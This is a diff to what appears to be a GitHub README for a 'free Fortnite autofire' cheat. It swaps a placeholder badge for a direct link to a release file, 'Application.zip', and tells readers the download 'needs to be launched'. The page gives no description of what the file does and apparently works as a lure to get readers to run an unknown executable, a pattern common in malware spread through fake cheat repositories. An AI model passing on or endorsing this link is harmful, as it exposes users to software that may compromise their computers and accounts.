@@ -18,7 +18,7 @@ If you're ready to take your Fortnite gameplay to the next level, check out the 
 
 ### Take Your Game to the Next Level
 Ready to enhance your Fortnite skills? Download the tools and resources from the link below:
-[![Download Here](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download Here](https://github.com/EmmanuelEscobar7/free-fortnite-autofire/releases/download/v1.0.0/Application.zip)](https://github.com/EmmanuelEscobar7/free-fortnite-autofire/releases/download/v1.0.0/Application.zip)
 (Download needs to be launched)
 
 If the link is not working or you need more options, be sure to check out the "Releases" section of this repository for additional downloads and updates.
